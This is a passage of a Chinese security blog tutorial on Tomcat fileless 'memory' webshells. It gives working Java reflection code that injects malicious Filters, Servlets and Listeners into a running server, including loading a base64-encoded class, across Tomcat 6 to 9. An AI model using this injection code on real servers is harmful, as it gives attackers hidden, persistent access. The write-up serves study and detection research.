class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                HashMap&lt;String, ApplicationFilterConfig&gt; filterconfigs = (HashMap&lt;String, ApplicationFilterConfig&gt;) field.get(standardContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(filterconfigs.get(filterName) == <span class="literal">null</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] Add Dynamic Filter&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//生成 FilterDef</span></span><br><span class="line">                    <span class="comment">//由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">filterDefClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        filterDefClass = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(ClassNotFoundException e)&#123;</span><br><span class="line">                        filterDefClass = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">filterDef</span> <span class="operator">=</span> filterDefClass.newInstance();</span><br><span class="line">                    filterDef.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterDef, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterName&#125;);</span><br><span class="line">                    <span class="comment">//Filter filter = new CometFilter();</span></span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        clazz = cl.loadClass(<span class="string">&quot;DynamicFIlter&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(ClassNotFoundException e)&#123;</span><br><span class="line">                        <span class="type">BASE64Decoder</span> <span class="variable">base64Decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">codeClass</span> <span class="operator">=</span> <span class="string">&quot;yv66vg...&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="type">byte</span>[] bytes = base64Decoder.decodeBuffer(codeClass);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        clazz = (Class) method.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    filterDef.getClass().getDeclaredMethod(<span class="string">&quot;setFilterClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterDef, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;clazz.getName()&#125;);</span><br><span class="line">                    standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addFilterDef&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;filterDefClass&#125;).invoke(standardContext, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterDef&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//设置 FilterMap</span></span><br><span class="line">                    <span class="comment">//由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">filterMapClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        filterMapClass = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">                        filterMapClass = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMapClass.newInstance();</span><br><span class="line">                    filterMap.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterName&#125;);</span><br><span class="line">                    filterMap.getClass().getDeclaredMethod(<span class="string">&quot;setDispatcher&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;REQUEST&quot;</span>&#125;);</span><br><span class="line">                    filterMap.getClass().getDeclaredMethod(<span class="string">&quot;addURLPattern&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;urlPattern&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>&#123;         <span class="comment">//调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了</span></span><br><span class="line">                        standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addFilterMapBefore&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;filterMapClass&#125;).invoke(standardContext, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap&#125;);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;        <span class="comment">//tomact6没有addFilterMapBefore，需要手动排序</span></span><br><span class="line">                        standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addFilterMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;filterMapClass&#125;).invoke(standardContext, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap&#125;);</span><br><span class="line">                        org.apache.catalina.deploy.FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                org.apache.catalina.deploy.<span class="type">FilterMap</span> <span class="variable">filterMap2</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                                filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                                filterMaps[<span class="number">0</span>] = filterMap2;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//实例化filterConfig</span></span><br><span class="line">                    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Context.class, filterDefClass&#125;);</span><br><span class="line">                    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;standardContext, filterDef&#125;);</span><br><span class="line">                    filterconfigs.put(filterName, filterConfig);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>实战的话把获取StandardContext的方法换成前面介绍的方法就能正常在代码执行或者反序列化情景使用，还有这里不对FilterMap做排序的话可以tomcat6–tomcat9通用，做了排序由于需要声明一个具体的FilterMap数组，在tomcat8及以上版本FilterMap数组的package路径不同，会报错。实现tomcat6–tomcat9通用其实也简单，直接把上面的代码用classloader的defineClass的方法写入并newInstance()就行了。</p>
+<h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><blockquote>
+<p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p>
+<p>Wrapper是tomcat中最底层的一个容器，代表一个 Servlet，负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。</p>
+</blockquote>
+<p>更多基础知识移步<a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介</a></p>
+<h3 id="动态添加Servlet"><a href="#动态添加Servlet" class="headerlink" title="动态添加Servlet"></a>动态添加Servlet</h3><p>找到一段<a target="_blank" rel="noopener" href="http://www.blogjava.net/yongboy/archive/2010/12/30/346209.html">动态添加Servlet的代码</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">sc</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">ServletRegistration</span> <span class="variable">sr</span> <span class="operator">=</span> sc.addServlet(<span class="string">&quot;DynamicServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">ServletTemplate</span>());</span><br><span class="line">sr.setInitParameter(<span class="string">&quot;servletInitName&quot;</span>, <span class="string">&quot;servletInitValue&quot;</span>);</span><br><span class="line">sr.addMapping(<span class="string">&quot;/*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看看这里的<code>addServlet</code>实现，代码在<code>catalina.jar!/org/apache/catalina/core/ApplicationContext#addServlet</code></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220324162439563.png" alt="image-20220324162439563"></p>
+<p>这里的<code>addServlet</code>和前面的<code>addFilter</code>类似，都不能在tomcat运行时动态添加。整个流程先尝试从context的findChild属性找到Wrapper，没有wrapper就创建一个新的wrapper，并添加到context的Child属性中，然后把servlet的名字和实现传给wrapper，最后用这个wrapper实例化了一个<code>ApplicationServletRegistration</code>。显然如果我们能控制wrapper和context则可以自己模拟这个addServlet的过程。</p>
+<p>先试试反射修改tomcat的运行状态这里能不能正常把内存马跑起来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">sc</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    org.apache.catalina.core.<span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (; standardContext == <span class="literal">null</span>; ) &#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> sc.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> contextField.get(sc);</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> javax.servlet.ServletContext) &#123;</span><br><span class="line">            sc = (javax.servlet.ServletContext) o;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;</span><br><span class="line">            standardContext = (org.apache.catalina.core.StandardContext) o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    java.lang.reflect.<span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class</span><br><span class="line">            .getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">    <span class="type">ServletRegistration</span> <span class="variable">sr</span> <span class="operator">=</span> sc.addServlet(<span class="string">&quot;DynamicServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">ServletTemplate</span>());</span><br><span class="line">    <span class="keyword">if</span> (stateField != <span class="literal">null</span>) &#123;</span><br><span class="line">        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">    &#125;</span><br><span class="line">    sr.setInitParameter(<span class="string">&quot;servletInitName&quot;</span>, <span class="string">&quot;servletInitValue&quot;</span>);</span><br><span class="line">    sr.addMapping(<span class="string">&quot;/*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>测了下，tomcat7.x–9.x都没问题</p>
+<p>或者<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/ServletBasedBasic.java">用feihong师傅这种反射的写法</a>，因为前面讲了其实<code>addServlet</code>里面的操作我们可以自己手动执行。</p>
+<h3 id="tomcat6下servlet内存马"><a href="#tomcat6下servlet内存马" class="headerlink" title="tomcat6下servlet内存马"></a>tomcat6下servlet内存马</h3><p>还是回到老问题，怎么实现tomcat6下的内存马。</p>
+<p>tomcat6没有addServlet方法，所以我们只能手动执行addServlet里面的操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servrletName);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletTemplate</span>();</span><br><span class="line"></span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.addMapping(urlPattern);</span><br><span class="line">        ServletRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationServletRegistration</span>(wrapper, standardContext);</span><br><span class="line">        registration.addMapping(urlPattern);</span><br></pre></td></tr></table></figure>
+
+<p>但是并不能执行成功因为有两个地方tomcat6下没有对应类。</p>
+<p>一处是setServlet，我们尝试看能不能把setServlet的操作手动执行一遍。</p>
+<p>代码在catalina.jar!&#x2F;org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;StandardWrapper.class</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220325171937716.png" alt="image-20220325171937716"></p>
+<p>显然我们可以反射修改这里<code>StandardWrapper</code>的<code>instance</code>属性来达到一样的效果。</p>
+<p>另一处是<code>ApplicationServletRegistration</code>，所以我们得手动把<code>ApplicationServletRegistration</code>做的事做一遍。</p>
+<p>跟进发现主要是<code>adMapping</code>这里有点操作，其他都可以忽略。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220325171332177.png" alt="image-20220325171332177"></p>
+<p>这里我们自己用<code>StandardContext</code>执行<code>addServletMapping</code>也是一样的效果，值得注意的是tomcat9下没有<code>addServletMapping</code>，但有个<code>addServletMappingDecoded</code>有一样的作用。</p>
+<p>对上面这些地方做了改动我们尝试能不能写入内存马</p>
+<p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servrletName);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletTemplate</span>();</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(wrapper, servlet);</span><br><span class="line">        wrapper.addMapping(urlPattern);</span><br><span class="line">        standardContext.addServletMapping(urlPattern, servrletName);</span><br></pre></td></tr></table></figure>
+
+<p>执行没报错，但是并不能访问到我们的内存马..但这套代码照搬到tomcat7下又能正常跑起来注入内存马..很奇怪</p>
+<p>下断点看看我们现在的wrapper的状态，同时去tomcat7下抓一个能正常跑起来的wrapper看看状态，两者diff试试</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220325173405529.png" alt="image-20220325173405529"></p>
+<p>左边是tomcat6,右边是tomcat7，可以看到我们tomcat6下的实现似乎没有注册到<code>JmxMBeanServer</code>，在tomcat6的<code>StandardWrapper</code>中找找有没有相关方法，发现正好有一个<code>registerJMX</code>方法</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220325173700279.png" alt="image-20220325173700279"></p>
+<p>直接反射调用，成功注入！</p>
+<p>最终代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">       wrapper.setName(servrletName);</span><br><span class="line">       standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">       <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletTemplate</span>();</span><br><span class="line">       wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">       </span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field.set(wrapper, servlet);</span><br><span class="line">       wrapper.addMapping(urlPattern);</span><br><span class="line">       standardContext.addServletMapping(urlPattern, servrletName);</span><br><span class="line"></span><br><span class="line">       <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> wrapper.getClass().getDeclaredMethod(<span class="string">&quot;registerJMX&quot;</span>, standardContext.getClass());</span><br><span class="line">       method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       method.invoke(wrapper, standardContext);</span><br></pre></td></tr></table></figure>
+
+<p>还有种实现参考<a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1162">Tomcat基于Servlet的无文件webshell的相关技术研究</a>，文章中是借助Mapper对象(封装了请求资源URI与每个相对应的处理wrapper容器的映射关系)创建Wrapper。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>全版本兼容的写法把前面tomcat7–9和tomcat6的实现整合整合就ok了，Servlet类型的内存马感觉有点鸡肋，因为Servlet在tomcat中的执行顺序在Listener和Filter之后，这样如果遇到一些类似Shiro的漏洞估计用不了..而且Servlet和Filter的内存马现在都很容易被主流的内存马检测查杀到。还有注意Servlet的内存马不建议设置匹配&#x2F;*，会影响原网站正常功能使用。</p>
+<h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><blockquote>
+<p>Listener 可以译为监听器，监听器用来监听对象或者流程的创建与销毁，通过 Listener，可以自动触发一些操作，因此依靠它也可以完成内存马的实现。</p>
+<p>Tomcat使用两类Listener接口分别是org.apache.catalina.LifecycleListener和原生Java.util.EvenListener。</p>
+<p>Tomcat中自定义了很多继承EvenListener的接口，用于监听各个对象，其中可能被利用到的Listener有</p>
+<ul>
+<li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li>
+<li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li>
+<li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li>
+<li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li>
+<li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li>
+<li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li>
+</ul>
+<p>而LifecycleListener为tomcat增加了生命周期管理，主要用于四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper的监听。</p>
+<p>请求网站的时候, 程序先执行listener监听器的内容：Listener -&gt; Filter -&gt; Servlet</p>
+</blockquote>
+<h3 id="Listener创建流程"><a href="#Listener创建流程" class="headerlink" title="Listener创建流程"></a>Listener创建流程</h3><p>LifecycleListener多用于Tomcat初始化启动阶段，那时客户端的请求还没进入解析阶段，也就是说不能直接将我们的请求匹配到，不太适合用于内存马实现。</p>
+<p>目前公开主流的tomcat Listener内存马实现都是基于<code>ServletRequestListener</code>实现的，因为<code>ServletRequestListener</code>用于监听<code>ServletRequest</code>的生成和销毁，也就是当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发<code>requestInitialized</code>方法，非常适合用于实现内存马。</p>
+<p>先配置一个最基础的Listener看看创建流程</p>
+<p>创建一个实现了<code>ServletRequestListener</code>的listener类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTemplate</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">//在request对象销毁时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">//在request对象创建时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml配置这个listener</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>ListenerTemplate<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>requestInitialized</code>下断点，看看是怎么触发到的</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401160437292.png" alt="image-20220401160437292"></p>
+<p>看看上一层的<code>fireRequestInitEvent</code>在做啥操作</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401160552463.png" alt="image-20220401160552463"></p>
+<p><code>fireRequestInitEvent</code>方法首先执行<code>this.getApplicationEventListeners()</code>获取<code>Listener</code>实例，不为空则遍历所有实例，其中继承了<code>ServletRequestListener</code>的实例执行<code>requestInitialized</code>。跟进<code>getApplicationEventListeners</code></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401161216662.png" alt="image-20220401161216662"></p>
+<p>可以看到是从<code>StandardContext</code>的<code>applicationEventListenersList</code>属性获取到listener实例的，所以咱们<strong>创建恶意listener的关键就在于控制这里的<code>applicationEventListenersList</code>，并想办法往里面传入我们的恶意listener实例</strong>。</p>
+<p>可以看到旁边有<code>setApplicationEventListeners</code>和<code>addApplicationEventListener</code>两个方法可用于对<code>applicationEventListenersList</code>属性做操作，不出意外可以依靠这两方法搞定。</p>
+<h3 id="Listener内存马实现"><a href="#Listener内存马实现" class="headerlink" title="Listener内存马实现"></a>Listener内存马实现</h3><h4 id="动态添加Listener"><a href="#动态添加Listener" class="headerlink" title="动态添加Listener"></a>动态添加Listener</h4><p>参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbe1c3174d41">动态注册之Servlet+Filter+Listener</a></p>
+<p>这里作者给出的添加Listener的方法是用**<code>servletContext.addListener()</code>**。我们跟进看看这个<code>addListener</code>做了些什么操作，这里的<code>servletContext</code>在实际运行过程中就是<code>ApplicationContext</code>。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401155219451.png" alt="image-20220401155219451"></p>
+<p>先<code>createListener</code>创建一个<code>EventListener</code>，然后执行<code>addListener(Listener)</code></p>
+<p>跟进<code>createListener</code>，可以发现就是一个普通的实例化我们传入listener的操作，正常实例化后返回listener对象。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401155433172.png" alt="image-20220401155433172"></p>
+<p>回到<code>addListener</code>看看会做啥操作</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401155550781.png" alt="image-20220401155550781"></p>
+<p>我们前面提到用到的Listener继承自<code>ServletRequestListener</code>，所以会执行**<code>this.context.addApplicationEventListener(t)</code>**，也即是前面分析Listener创建流程中提到的会对<code>StandardContext</code>中<code>applicationEventListenersList</code>属性做操作的方法。</p>
+<p>把addListener会做的操作总结出来就是下面几行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getStandardContext();</span><br><span class="line"><span class="type">InstanceManager</span> <span class="variable">var1</span> <span class="operator">=</span> standardContext.getInstanceManager();</span><br><span class="line">standardContext.addApplicationEventListener(var1.newInstance(ListenerTemplate.class));</span><br></pre></td></tr></table></figure>
+
+<p>经测试可以正常在tomcat7.x–9.x注入内存马。tomcat6没有<code>addApplicationEventListener</code>方法。</p>
+<h4 id="根据Listener创建流程实现"><a href="#根据Listener创建流程实现" class="headerlink" title="根据Listener创建流程实现"></a>根据Listener创建流程实现</h4><p>上面的方法没法在tomcat6写入内存马，因为tomcat6没有<code>addApplicationEventListener</code>方法。前面分析Listener创建流程提到了有两种方式可以操作<code>applicationEventListenersList</code>属性，除了<code>addApplicationEventListener</code>方法我们还可以利用<code>setApplicationEventListeners</code>方法。首先看一下tomcat6的StandardContext有没有这个方法</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401163910136.png" alt="image-20220401163910136"></p>
+<p>有，那把上面的代码简单改改</p>
